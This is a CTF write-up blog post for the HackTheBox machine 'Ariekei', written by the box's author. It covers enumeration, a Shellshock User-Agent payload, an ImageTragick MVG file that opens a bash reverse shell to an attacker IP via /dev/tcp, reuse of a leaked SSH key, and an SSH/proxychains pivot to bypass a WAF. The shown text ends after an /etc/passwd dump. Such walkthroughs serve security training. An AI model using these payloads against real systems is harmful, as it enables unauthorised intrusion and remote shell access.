---
layout: post
title: HackTheBox - Ariekei Writeup
categories: [ctf]
tags: [ctf, hackthebox]
---
 

Ariekei was the first box I published through HackTheBox, and one of the most fun I've had building. 

This box is primarily in exercise in enumeration and network pivoting, with a fun priv esc technique to wrap it up.

## Table of Contents

- [Enumeration](#enumeration)
  * [Nmap](#nmap)
  * [Nikto](#nikto)
  * [OpenSSL](#openssl)
- [Calvin Container](#calvin)
- [Beehive Container](#Beehive)
- [Host Access](#Host)
- [Privilege Escalation](#PrivEsc)

## Enumeration 

### Nmap 

Intial nmap scan discovers 3 open ports, 22, 443, and 1022. 


```
Not shown: 997 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a7:5b:ae:65:93:ce:fb:dd:f9:6a:7f:de:50:67:f6:ec (RSA)
|_  256 64:2c:a6:5e:96:ca:fb:10:05:82:36:ba:f0:c9:92:ef (ECDSA)
443/tcp  open  ssl/http nginx 1.10.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.10.2
|_http-title: Site Maintenance
| ssl-cert: Subject: stateOrProvinceName=Texas/countryName=US
| Issuer: stateOrProvinceName=Texas/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-09-24T01:37:05
| Not valid after:  2045-02-08T01:37:05
| MD5:   d73e ffe4 5f97 52ca 64dc 7770 abd0 2b7f
|_SHA-1: 1138 148e dfbd 6ad8 367b 08c8 1725 7408 eedb 4a7b
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
1022/tcp open  ssh      OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 98:33:f6:b6:4c:18:f5:80:66:85:47:0c:f6:b7:90:7e (DSA)
|   2048 78:40:0d:1c:79:a1:45:d4:28:75:35:36:ed:42:4f:2d (RSA)
|_  256 45:a6:71:96:df:62:b5:54:66:6b:91:7b:74:6a:db:b7 (ECDSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Nikto 

Running nitko reveals a unique header which seems to contain a hostname, possibly a vhost name. We also see that `/cgi-bin/stats`  file exists. 

```
$ nikto -host 10.10.99.5 -ssl 
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.99.5
+ Target Hostname:    ariekei
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject: /C=US/ST=Texas/L=Dallas/OU=Ariekei
                   Ciphers: ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:  /C=US/ST=Texas/L=Dallas/OU=Ariekei
+ Start Time:         2017-09-26 14:15:53 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.10.2
+ Server leaks inodes via ETags, header found with file /, inode: 1057715, size: 487, mtime: 0x55943d606bd00
+ The anti-clickjacking X-Frame-Options header is not present.
+ Uncommon header 'x-ariekei-waf' found, with contents: beehive.ariekei.htb
+ OSVDB-3092: /cgi-bin/stats/: This might be interesting...

```

If we set DNS for beehive.ariekei.htb, the same page still loads, which suggests it is just the default virtualhost. 

Checking out the cgi script, it apparently returns the servers environment variables. 

```
$ curl -v -k https://10.10.99.5/cgi-bin/stats
*   Trying 10.10.99.5...
* Connected to 10.10.99.5 (10.10.99.5) port 443 (#0)
* found 173 certificates in /etc/ssl/certs/ca-certificates.crt
* found 697 certificates in /etc/ssl/certs
* ALPN, offering http/1.1
* SSL connection using TLS1.2 / ECDHE_RSA_AES_128_GCM_SHA256
* 	 server certificate verification SKIPPED
* 	 server certificate status verification SKIPPED
* error fetching CN from cert:The requested data were not available.
* 	 common name:  (does not match '10.10.99.5')
* 	 server certificate expiration date OK
* 	 server certificate activation date OK
* 	 certificate public key: RSA
* 	 certificate version: #3
* 	 subject: C=US,ST=Texas,L=Dallas,OU=Ariekei
* 	 start date: Sun, 24 Sep 2017 01:37:05 GMT
* 	 expire date: Wed, 08 Feb 2045 01:37:05 GMT
* 	 issuer: C=US,ST=Texas,L=Dallas,OU=Ariekei
* 	 compression: NULL
* ALPN, server accepted to use http/1.1
> GET /cgi-bin/stats HTTP/1.1
> Host: 10.10.99.5
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: nginx/1.10.2
< Date: Tue, 26 Sep 2017 18:18:55 GMT
< Content-Type: text/html
< Transfer-Encoding: chunked
< Connection: keep-alive
< Vary: Accept-Encoding
< X-Ariekei-WAF: beehive.ariekei.htb
< 
<pre>
Tue Sep 26 18:18:55 UTC 2017
18:18:55 up 11 min, 0 users, load average: 0.10, 0.18, 0.09
Environment Variables:
<pre>
Tue Sep 26 18:24:46 UTC 2017
18:24:46 up 17 min, 0 users, load average: 0.24, 0.10, 0.07
GNU bash, version 4.2.37(1)-release (x86_64-pc-linux-gnu) Copyright (C) 2011 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html> This is free software; you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law.
Environment Variables:
<pre>
SERVER_SIGNATURE=<address>Apache/2.2.22 (Debian) Server at 10.10.99.5 Port 80</address>

HTTP_USER_AGENT=curl/7.47.0
HTTP_X_FORWARDED_FOR=192.168.100.178
SERVER_PORT=80
HTTP_HOST=10.10.99.5
HTTP_X_REAL_IP=192.168.100.178
DOCUMENT_ROOT=/home/spanishdancer/content
SCRIPT_FILENAME=/usr/lib/cgi-bin/stats
REQUEST_URI=/cgi-bin/stats
SCRIPT_NAME=/cgi-bin/stats
HTTP_CONNECTION=close
REMOTE_PORT=35542
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PWD=/usr/lib/cgi-bin
SERVER_ADMIN=webmaster@localhost
HTTP_ACCEPT=*/*
REMOTE_ADDR=172.24.0.1
SHLVL=1
SERVER_NAME=10.10.99.5
SERVER_SOFTWARE=Apache/2.2.22 (Debian)
QUERY_STRING=
SERVER_ADDR=172.24.0.2
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.0
REQUEST_METHOD=GET
_=/usr/bin/env
</pre>
</pre>
* Connection #0 to host 10.10.99.5 left intact

```

This gives us some notable pieces of information:
1. The docroot is set to a users home directory: `DOCUMENT_ROOT=/home/spanishdancer/content` 
2. Backend server version is `SERVER_SOFTWARE=Apache/2.2.22 (Debian)` , which is different than what we actually get back in the header. This suggests some type of reverse proxy or WAF - `Server: nginx/1.10.2` 
4. Server has internal IP address of 172.24.0.2
3. Bash version 4.2.37 + cgi == shellshock 

When we try to exploit shellshock however, the payload is most likely caught by the WAF and blocked. We get a 403 response page:

```
$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'" https://beehive.ariekei.htb/cgi-bin/stats -k -v
*   Trying 10.10.99.5...
* Connected to beehive.ariekei.htb (10.10.99.5) port 443 (#0)
* found 173 certificates in /etc/ssl/certs/ca-certificates.crt
* found 697 certificates in /etc/ssl/certs
* ALPN, offering http/1.1
* SSL connection using TLS1.2 / ECDHE_RSA_AES_128_GCM_SHA256
* 	 server certificate verification SKIPPED
* 	 server certificate status verification SKIPPED
* error fetching CN from cert:The requested data were not available.
* 	 common name:  (matched)
* 	 server certificate expiration date OK
* 	 server certificate activation date OK
* 	 certificate public key: RSA
* 	 certificate version: #3
* 	 subject: C=US,ST=Texas,L=Dallas,OU=Ariekei
* 	 start date: Sun, 24 Sep 2017 01:37:05 GMT
* 	 expire date: Wed, 08 Feb 2045 01:37:05 GMT
* 	 issuer: C=US,ST=Texas,L=Dallas,OU=Ariekei
* 	 compression: NULL
* ALPN, server accepted to use http/1.1
> GET /cgi-bin/stats HTTP/1.1
> Host: beehive.ariekei.htb
> Accept: */*
> user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'
> 
< HTTP/1.1 403 Forbidden
< Server: nginx/1.10.2
< Date: Tue, 26 Sep 2017 18:27:58 GMT
< Content-Type: text/html
< Content-Length: 1618
< Connection: keep-alive
< ETag: "59c335fa-652"
< Last-Modified: Thu, 21 Sep 2017 03:46:02 GMT
< 

<pre>
                          oooo$$$$$$$$$$$$oooo
                      oo$$$$$$$$$$$$$$$$$$$$$$$$o
                   oo$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$o         o$   $$ o$
   o $ oo        o$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$o       $$ $$ $$o$
oo $ $ "$      o$$$$$$$$$    $$$$$$$$$$$$$    $$$$$$$$$o       $$$o$$o$
"$$$$$$o$     o$$$$$$$$$      $$$$$$$$$$$      $$$$$$$$$$o    $$$$$$$$
  $$$$$$$    $$$$$$$$$$$      $$$$$$$$$$$      $$$$$$$$$$$$$$$$$$$$$$$
  $$$$$$$$$$$$$$$$$$$$$$$    $$$$$$$$$$$$$    $$$$$$$$$$$$$$  """$$$
   "$$$""""$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     "$$$
    $$$   o$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     "$$$o
   o$$"   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$       $$$o
   $$$    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$" "$$$$$$ooooo$$$$o
  o$$$oooo$$$$$  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$   o$$$$$$$$$$$$$$$$$
  $$$$$$$$"$$$$   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     $$$$""""""""
 """"       $$$$    "$$$$$$$$$$$$$$$$$$$$$$$$$$$$"      o$$$
            "$$$o     """$$$$$$$$$$$$$$$$$$"$$"         $$$
              $$$o          "$$""$$$$$$""""           o$$$
               $$$$o                                o$$$"
                "$$$$o      o$$$$$$o"$$$$o        o$$$$
                  "$$$$$oo     ""$$$$o$$$$$o   o$$$$""
                     ""$$$$$oooo  "$$$o$$$$$$$$$"""
                        ""$$$$$$$oo $$$$$$$$$$
                                """"$$$$$$$$$$$
                                    $$$$$$$$$$$$
                                     $$$$$$$$$$"
                                      "$$$""""

</pre>

* Connection #0 to host beehive.ariekei.htb left intact
```

(ADMIN NOTE: Even if the exploit somehow bypassws the WAF signature, the backend server employs egress filtering, so no remote shells. THis is to stay true to the exercise in pivoting later).

Running dirbuster will also reveal a `/blog/` path, but there is nothing interesting here. It is a static html blog template.

### Openssl

Go back to the drawing board, and investigate the SSL certificate. There are two subject names, one `beehive.ariekei.htb`, the other `calvin.ariekei.htb`. You can find this by viewing the cert in a browser, or by command line fu (see `X509v3 Subject Alternative Name` section: 

```
$ openssl s_client -connect 10.10.99.5:443 2>&1 | openssl x509 -text           
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 15365148714287133427 (0xd53bf958fc2272f3)
    Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=US, ST=Texas, L=Dallas, OU=Ariekei
        Validity
            Not Before: Sep 24 01:37:05 2017 GMT
            Not After : Feb  8 01:37:05 2045 GMT
        Subject: C=US, ST=Texas, L=Dallas, OU=Ariekei
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:cf:95:f3:f5:48:00:93:52:c9:1a:78:0e:6c:49:
                    2d:5c:ea:5c:cf:56:58:28:d8:84:5b:d5:cc:45:54:
                    c1:7d:fe:c5:40:d6:3f:75:4b:5c:ab:73:f4:52:f6:
                    a0:3b:f6:d3:f8:3c:39:ff:0e:ee:ee:04:81:34:91:
                    f3:17:7d:7b:46:6d:12:88:f5:50:a5:70:0c:a6:9e:
                    59:06:9d:70:b6:e8:63:69:6f:d4:92:cd:d8:f7:5d:
                    72:9d:1e:3f:5c:5c:fd:5f:16:cf:7e:95:90:3d:5b:
                    cb:4f:48:19:a0:7c:b1:43:4e:5e:59:7f:63:2c:c6:
                    f9:0e:a5:3b:8e:e1:20:12:31:4e:66:04:30:e4:c1:
                    84:b8:93:6e:a7:1c:af:00:35:76:46:2c:ba:7a:2d:
                    b7:61:3c:59:ed:e7:09:43:aa:91:c8:f3:2a:00:07:
                    00:30:54:dd:17:c0:2e:3d:54:18:c6:7b:ed:2b:a6:
                    f5:bc:c3:7e:2a:df:bd:76:2f:a7:48:7f:bd:f4:4b:
                    f8:0d:33:90:2a:c6:7b:50:15:36:f5:36:7d:cb:9a:
                    20:8f:2f:9f:74:f0:9a:30:28:4d:51:68:fa:a4:71:
                    ac:22:ce:af:3a:78:48:1c:db:c5:0c:ba:c3:55:78:
                    a0:6b:a8:fc:b8:ba:72:28:11:6c:e5:7b:0b:af:8f:
                    7a:87
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Basic Constraints: 
                CA:FALSE
            X509v3 Key Usage: 
                Digital Signature, Non Repudiation, Key Encipherment
            X509v3 Subject Alternative Name: 
                DNS:calvin.ariekei.htb, DNS:beehive.ariekei.htb
    Signature Algorithm: sha256WithRSAEncryption
         34:2f:72:bd:49:38:2a:9d:b5:5b:e2:e3:1d:c4:4d:17:fe:38:
         89:c6:21:2b:33:36:69:f3:05:45:4a:91:19:a9:ff:bf:fb:69:
         51:7e:61:c7:a7:23:00:0a:bb:84:b4:db:19:68:b4:c4:84:38:
         f9:f4:02:8e:f9:fc:2b:ca:15:76:6c:7d:49:ce:4c:c9:38:95:
         38:7a:14:db:56:29:73:21:a5:03:42:eb:29:ad:33:22:11:5d:
         b2:1f:48:52:2b:19:34:66:ec:43:c1:34:df:f6:6c:63:99:5c:
         ed:2c:dd:28:dc:9b:6c:7e:e7:de:b8:85:20:80:1c:6b:75:7c:
         2d:4a:be:07:b4:72:d8:bb:cd:0c:f7:1c:50:36:76:c1:16:16:
         99:e1:b8:e5:01:f3:2d:4d:a9:08:60:c1:d5:d3:57:1a:9e:82:
         79:e6:fb:88:18:64:54:6a:cc:8b:0f:3b:4e:d7:26:b1:28:46:
         20:36:d2:f8:88:a6:89:e0:8d:be:ed:ec:70:e6:fd:9d:da:2a:
         ea:09:57:9c:84:08:d7:9b:05:7d:a6:ff:86:b9:af:b1:4e:53:
         ed:fa:92:30:09:e8:cc:30:96:bf:4f:2e:10:45:95:fe:c3:24:
         c0:33:63:ad:73:d1:89:c0:25:64:15:f6:d2:4f:2b:25:b2:d1:
         cb:2a:d1:c3
-----BEGIN CERTIFICATE-----
MIIDUTCCAjmgAwIBAgIJANU7+Vj8InLzMA0GCSqGSIb3DQEBCwUAMEAxCzAJBgNV
BAYTAlVTMQ4wDAYDVQQIDAVUZXhhczEPMA0GA1UEBwwGRGFsbGFzMRAwDgYDVQQL
DAdBcmlla2VpMB4XDTE3MDkyNDAxMzcwNVoXDTQ1MDIwODAxMzcwNVowQDELMAkG
A1UEBhMCVVMxDjAMBgNVBAgMBVRleGFzMQ8wDQYDVQQHDAZEYWxsYXMxEDAOBgNV
BAsMB0FyaWVrZWkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDPlfP1
SACTUskaeA5sSS1c6lzPVlgo2IRb1cxFVMF9/sVA1j91S1yrc/RS9qA79tP4PDn/
Du7uBIE0kfMXfXtGbRKI9VClcAymnlkGnXC26GNpb9SSzdj3XXKdHj9cXP1fFs9+
lZA9W8tPSBmgfLFDTl5Zf2MsxvkOpTuO4SASMU5mBDDkwYS4k26nHK8ANXZGLLp6
LbdhPFnt5wlDqpHI8yoABwAwVN0XwC49VBjGe+0rpvW8w34q3712L6dIf730S/gN
M5AqxntQFTb1Nn3LmiCPL5908JowKE1RaPqkcawizq86eEgc28UMusNVeKBrqPy4
unIoEWzlewuvj3qHAgMBAAGjTjBMMAkGA1UdEwQCMAAwCwYDVR0PBAQDAgXgMDIG
A1UdEQQrMCmCEmNhbHZpbi5hcmlla2VpLmh0YoITYmVlaGl2ZS5hcmlla2VpLmh0
YjANBgkqhkiG9w0BAQsFAAOCAQEANC9yvUk4Kp21W+LjHcRNF/44icYhKzM2afMF
RUqRGan/v/tpUX5hx6cjAAq7hLTbGWi0xIQ4+fQCjvn8K8oVdmx9Sc5MyTiVOHoU
21YpcyGlA0LrKa0zIhFdsh9IUisZNGbsQ8E03/ZsY5lc7SzdKNybbH7n3riFIIAc
a3V8LUq+B7Ry2LvNDPccUDZ2wRYWmeG45QHzLU2pCGDB1dNXGp6Ceeb7iBhkVGrM
iw87TtcmsShGIDbS+IimieCNvu3scOb9ndoq6glXnIQI15sFfab/hrmvsU5T7fqS
MAnozDCWv08uEEWV/sMkwDNjrXPRicAlZBX20k8rJbLRyyrRww==
-----END CERTIFICATE-----

```

Again setting DNS, the different vhost returns a 404 page

```
$ curl -k https://calvin.ariekei.htb/    
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server.  If you entered the URL manually please check your spelling and try again.</p>

```

Nothing interesting comes back with nitko on this vhost, so turn to dirbuster. 

```
$ nikto -host https://calvin.ariekei.htb/                                                                                      1
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.99.5
+ Target Hostname:    calvin.ariekei.htb
+ Target Port:        443
+ Start Time:         2017-09-26 14:33:31 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.10.2
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 6544 items checked: 0 error(s) and 1 item(s) reported on remote host
+ End Time:           2017-09-26 14:33:49 (GMT-4) (18 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

Using dirbuster with extensions disabled, we discover a `/upload` page. 

Browsing to it, it is an image upload form titled "Image Converter". Uploading anything but the intended exploit is futile here since you can't browse the uploads directory. One might think to use  `ImageTragick` , but if not, there is a hint in the HTML source in the page, hopefully obvious enough to guide someone toward ImageTragick:

```
<!--
                                 
                            g@@
        A.                 d@V@
        i@b               iA` @                    .A
        i@V@s            dA`  @                   ,@@i
        i@ '*@Ws______mW@f    @@                  ]@@@
         @]  '^********f`     @@@                g@!l@
         @b           .  ,g   @@@W             ,W@[ l@
         ]@   Mmmmmf  ~**f^   @@^@@Wm_.      _g@@`  l@
          M[    ^^      ^^    @@  ^*@@@@@@@@@@@f`   l@
          ]@i  '[]`  . '[]`   @@      ~~~~~~~`      l@
          '@W       |[        @@               _.   l@
           Y@i      'Ns    .  @@   _m@@m,    g*~VWi l@
            M@. ,.       g@` ]@@  gP    V,  '  m- ` l@
            '@W  Vmmmmmm@f   @@@. ~  m-    g   '    l@
             '@b  'V***f    g@A@W    '     @        l@
              '*W_         g@A`M@b       g M_.      l@
                'VMms___gW@@f   @@.      '- ~`      W@
                   ~*****f~`     @@.     ,_m@Ws__   @@
                                 '@@.   gA~`   ~~* ]@P
                                   M@s.'`         g@A
                                    V@@Ws.    __m@@A
                                      ~*M@@@@@@@@*`   (ASCII Art credit to David Laundra) 
-->

```

## Calvin

Upload a malicious mvg as documented here: <https://imagetragick.com/>


We'll set up a reverse shell, and upload our malicious mvg file: 

```
$ cat exploit.mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|setsid /bin/bash -i >/dev/tcp/10.10.99.55/6661 0<&1 2>&1 &")'
pop graphic-context

```

Upload file ... 


```
$ ncat -lvp 6661
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::6661
Ncat: Listening on 0.0.0.0:6661
Ncat: Connection from 10.10.99.5.
Ncat: Connection from 10.10.99.5:55164.
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell

[root@calvin app]# 

```

Immediately suspicious is that we have root right form the start. It may be assumed we're in a container or jail of some sort, and need to break out. 

Looking around the filesystem, there is a `/common` directory mounted with some interesting directories and files:

```
[root@calvin common]# ls -la /common
ls -la /common
total 20
drwxr-xr-x  5 root root 4096 Sep 23 18:36 .
drwxr-xr-x 36 root root 4096 Sep 26 18:48 ..
drwxrwxr-x  2 root root 4096 Sep 24 00:59 .secrets
drwxr-xr-x  6 root root 4096 Sep 23 18:32 containers
drwxr-xr-x  2 root root 4096 Sep 24 02:27 network

```

In the `.secrets` folder, there is an ssh key pair, but nowhere to really use it. 

```
[root@calvin .secrets]# ls -la
ls -la
total 16
drwxrwxr-x 2 root root 4096 Sep 24 00:59 .
drwxr-xr-x 5 root root 4096 Sep 23 18:36 ..
-r--r----- 1 root root 1679 Sep 23 17:51 bastion_key
-r--r----- 1 root root  393 Sep 23 17:51 bastion_key.pub
```

In the `containers` directory, there are subdirectories containing the build information for docker containers, including the IP addresses they have. 

For example, the `bastion` container (matching the keypair) has some important info in this files:

```
[root@calvin containers]# ls -la
ls -la
total 24
drwxr-xr-x 6 root root  4096 Sep 23 18:32 .
drwxr-xr-x 5 root root  4096 Sep 23 18:36 ..
drwxr-xr-x 2 root input 4096 Sep 24 00:58 bastion-live
drwxr-xr-x 5 root input 4096 Sep 23 23:34 blog-test
drwxr-xr-x 3 root root  4096 Sep 24 01:39 convert-live
drwxr-xr-x 5 root root  4096 Sep 24 03:49 waf-live
[root@calvin containers]# cd bastion-live
cd bastion-live

[root@calvin bastion-live]# ls -la
ls -la
total 24
drwxr-xr-x 2 root input 4096 Sep 24 00:58 .
drwxr-xr-x 6 root root  4096 Sep 23 18:32 ..
-rw-r--r-- 1 root input  546 Sep 21 05:00 Dockerfile
-rwxrwxr-x 1 root input   47 Sep 21 04:54 build.sh
-rw-r--r-- 1 root root  2588 Sep 24 00:58 sshd_config
-rwxrwxr-x 1 root input  302 Sep 23 18:37 start.sh

[root@calvin bastion-live]# cat Dockerfile
cat Dockerfile
FROM rastasheep/ubuntu-sshd
RUN echo "root:Ib3!kTEvYw6*P7s" | chpasswd
RUN mkdir -p /root/.ssh
RUN echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDwzZ8tXRyG6en6U8d4r/oL/fpx2Aw+V22u8dJjNnSP9jly+RFJk8Z+aKMFTIYJ+orjyMxieqMtyYdVOUDvCanMnChmPbIWqw6UzdV+nnBrWTE/4keDSRn8ijs10tPPiBDDDpqQf21XiiyUfD0RkAl3gJk6hw7wHfWEilR1KWflbNAlau+lfM9YOFLbYrFmpKnZivqkDtuEPfnIVDurS2CiDC+oS+fnP2nGcIMec95iiPpJ4MhPvbdlb+UCxV6FoNtehT9ciZukD0xIXakwAwGlPlFQbzQqqEjEh5ltvnaJG6QzPfLnB6Uis8ku0NNDitreBm2Ba9sJ8NpXh46Ighhh root@arieka" > /root/.ssh/authorized_keys
RUN mkdir /common

[root@calvin bastion-live]# cat start.sh
cat start.sh
docker run \
--restart on-failure:5 \
--net arieka-live-net --ip 172.23.0.253 \
-h ezra.ariekei.htb --name bastion-live -dit \
-v /opt/docker:/common:ro \
-v $(pwd)/sshd_config:/etc/ssh/sshd_config:ro \
-p 1022:22 bastion-template

docker network connect --ip 172.24.0.253 arieka-test-net bastion-live

```

Noteworthy: 

1. hardcoded root password is set for the container
2. container has two networks and two IP's 172.24.0.253 and 172.23.0.253, suggesting it is dual homed. 
3. this is the SSH service exposed on port 1022 on the host

We can also get the IP addresses for each docker container from these files, but bastion is the most important. If we look at the `blog-test` containers, it seems to mount a home directory from the host:

```
[root@calvin blog-test]# cat start.sh
cat start.sh
docker run \
--restart on-failure:5 \
--net arieka-test-net --ip 172.24.0.2 \
-h beehive.ariekei.htb --name blog-test -dit \
-v /opt/docker:/common:ro \
-v $(pwd)/cgi:/usr/lib/cgi-bin:ro \
-v $(pwd)/config:/etc/apache2:ro \
-v $(pwd)/logs:/var/log/apache2 \
-v /home/spanishdancer:/home/spanishdancer:ro  web-templat
```

If we try to login to the Bastion box using the hardcoded password, it wont work, since publickey is the only accepted auth form:

```
$ ssh root@10.10.99.5  -p 1022
The authenticity of host '10.10.99.5 (10.10.99.5)' can't be established.
ECDSA key fingerprint is SHA256:00QUDuqn+W8071V5kz4hM6rnINCedq8xiLh4igg9+XM.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.99.5' (ECDSA) to the list of known hosts.
Permission denied (publickey).

```

Instead, copy the private `bastion_key`, and log in with that. Since there is no scp,netcat, wget, etc on the target, we can just copy paste this to a file, and login. 

```
$  ssh -i bastion_key  root@10.10.99.5 -p 1022                                   255
The authenticity of host '[10.10.99.5]:1022 ([10.10.99.5]:1022)' can't be established.
ECDSA key fingerprint is SHA256:QgT9RAleDDDYJd1urpHktRWAjXUsNfdOU4G6p4fXDMY.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[10.10.99.5]:1022' (ECDSA) to the list of known hosts.
Last login: Sun Sep 24 00:53:25 2017 from greenmonster.knotwork.lcl
root@ezra:~# 


```

This gets us access to an SSH bastion host, again, an apparent container. So looking around on the filesystem again in the `/common` directory, there is a `network` subdirectory.

```
root@ezra:/common# cd network/
root@ezra:/common/network# ls -la
total 52
drwxr-xr-x 2 root root  4096 Sep 24 02:27 .
drwxr-xr-x 5 root root  4096 Sep 23 18:36 ..
-rw-r--r-- 1 root root 39774 Sep 24 02:27 info.png
-rwxr-xr-x 1 root root   437 Sep 23 18:23 make_nets.sh

```

The `make_nets.sh` script appears to be what created the docker container networks. We might infer from admin comments that one network has restricted internet access:


```
root@ezra:/common# cd network/
root@ezra:/common/network# ls -la
total 52
drwxr-xr-x 2 root root  4096 Sep 24 02:27 .
drwxr-xr-x 5 root root  4096 Sep 23 18:36 ..
-rw-r--r-- 1 root root 39774 Sep 24 02:27 info.png
-rwxr-xr-x 1 root root   437 Sep 23 18:23 make_nets.sh
root@ezra:/common/network# cat make_nets.sh 
#!/bin/bash

# Create isolated network for building containers. No internet access
docker network create -d bridge --subnet=172.24.0.0/24 --gateway=172.24.0.1 --ip-range=172.24.0.0/24 \
 -o com.docker.network.bridge.enable_ip_masquerade=false \
  arieka-test-net

# Crate network for live containers. Internet access
docker network create -d bridge --subnet=172.23.0.0/24 --gateway=172.23.0.1 --ip-range=172.23.0.0/24 \
 arieka-live-net

```

Again, no wget or curl or netcat here, so if we wanted to check out the info.png file, we have to copy it off the host with scp:

```
$ sftp -i bastion_key -P 1022 root@10.10.99.5
Connected to 10.10.99.5.
sftp> get /common/network/info.png 
Fetching /common/network/info.png to info.png
/common/network/info.png                                              100%   39KB  38.8KB/s   00:00    

```

The file is not a necessity, but a great hint to the layout of the segmented docker network. The bastion host is in fact dual homed, and can communicate directly with containers on that network. This means it might be possible to bypass the WAF for that shellshock exploit discovered earlier, but we would need to pivot all traffic through the bastion! We can infer the same information from the docker start scripts, but this is a visualization. 

See ezra is dual homed:
```
root@ezra:~# ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:ac:17:00:fd  
          inet addr:172.23.0.253  Bcast:0.0.0.0  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:517 errors:0 dropped:0 overruns:0 frame:0
          TX packets:399 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:54489 (54.4 KB)  TX bytes:105319 (105.3 KB)

eth1      Link encap:Ethernet  HWaddr 02:42:ac:18:00:fd  
          inet addr:172.24.0.253  Bcast:0.0.0.0  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:34 errors:0 dropped:0 overruns:0 frame:0
          TX packets:23 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:4437 (4.4 KB)  TX bytes:1759 (1.7 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:22 errors:0 dropped:0 overruns:0 frame:0
          TX packets:22 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:1854 (1.8 KB)  TX bytes:1854 (1.8 KB)

```

## Beehive

We need to set up two pivots.

One pivot is tunnel traffic through the bastion host to exploit shellshock (going around the WAF), the other to catch the reverse shell (since egress filtering is applied)


First, proxy traffic through the bastion host to exploit shellshock. I use proxychains for this, but other options are certainly available

```
$ ssh -D 9020 -i bastion_key root@10.10.99.5 -p 1022  
$ proxychains curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'" http://172.24.0.2/cgi-bin/stats 

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9020-<><>-172.24.0.2:80-<><>-OK

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
